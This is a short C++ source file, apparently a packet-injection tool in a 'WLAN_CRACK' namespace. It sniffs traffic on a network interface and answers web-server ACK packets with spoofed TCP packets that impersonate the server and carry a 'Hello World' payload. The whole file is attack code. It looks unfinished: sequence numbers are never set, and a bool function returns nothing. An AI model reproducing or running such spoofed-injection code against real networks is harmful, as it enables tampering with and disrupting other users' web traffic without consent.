//
// Created by skyclad on 7/31/17.
//
#include "PacketSniffer.h"

Tins::PacketSender sender;
const char *CustomResponse = "Hello World";

bool SendFakeTCPResponse(Tins::IP::address_type srcAddr, Tins::IP::address_type dstAddr, uint16_t srcPort, uint16_t dstPort)
{
    Tins::IP ip(dstAddr, srcAddr);
    Tins::TCP tcp(dstPort, srcPort);
    tcp.flags(0x19);
    Tins::RawPDU raw((uint8_t *)CustomResponse, 11); //Tins::TCP((const uint8_t *)CustomResponse, 11);
    auto pkt = ip / tcp / raw;
    sender.send(pkt);
    std::clog << "Fake Response sended" << std::endl;
}

bool PacketHandler(Tins::PDU& pdu)
{
    if(pdu.find_pdu<Tins::TCP>()){
        const Tins::IP &ip = pdu.rfind_pdu<Tins::IP>();
        const Tins::TCP &tcp = pdu.rfind_pdu<Tins::TCP>();
        if(tcp.sport() == 80 && tcp.flags() == 0x010 ) {
            SendFakeTCPResponse(ip.dst_addr(), ip.src_addr(), tcp.dport(), tcp.sport());
            std::clog << " *** [" << ip.src_addr() << ":" << tcp.sport() << "] => [" << ip.dst_addr() << ":"
                      << tcp.dport() << "] ***" << std::endl;
        }
    }
    return true;
}

int main(int argc, char *argv[])
{
    if (argc != 3) {
        std::cerr << "[-] Usage : " << argv[0] << " [interface] [filter]" << std::endl;
        return -1;
    }
    sender.default_interface(argv[1]);
    WLAN_CRACK::PacketSniffer sniffer(argv[1], argv[2]);
    sniffer.StartSniffing(&PacketHandler);
    return 0;
}